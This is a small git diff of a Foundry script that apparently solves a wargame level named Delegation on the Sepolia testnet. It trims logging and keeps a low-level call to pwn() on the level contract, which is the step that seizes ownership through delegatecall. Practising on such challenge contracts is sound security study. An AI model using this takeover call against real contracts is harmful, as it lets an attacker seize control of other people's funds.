@@ -19,7 +19,7 @@ import "../src/levels/Delegation.sol";
         --rpc-url sepolia \
         --account auditor \
         --sender 0x471cd8eaa5d60c2ed4dd42cc3b0de75ecfbbda62 \
-        -vvvv
+        -vv
     ```
 
     Results of running this script (with --broadcast) are in this scripts 
@@ -33,7 +33,6 @@ contract DelegationScript is Script {
 
     function run() external {
         vm.startBroadcast();
-        console.log("msg.sender: ", msg.sender);
 
         (bool success,) = address(level6).call(abi.encodeWithSignature("pwn()"));
         require(success, "call not successful");
